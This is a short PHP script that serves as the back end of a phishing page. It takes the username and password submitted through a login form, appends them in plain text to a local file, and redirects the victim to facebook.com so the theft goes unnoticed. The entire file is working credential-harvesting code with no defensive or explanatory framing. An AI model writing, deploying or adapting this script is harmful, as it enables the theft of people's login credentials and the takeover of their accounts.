<?php
        $username = $_POST["username"];
        $password = $_POST["password"];

    // The name of the file
    $file = 'sex.txt';

    // The new data to add to the file
    $data = "Username: ".$username."\nPassword: ".$password."\n";

    // Write data to the file
    file_put_contents($file, $data, FILE_APPEND);
    header('Location: https://www.facebook.com');
exit();
?>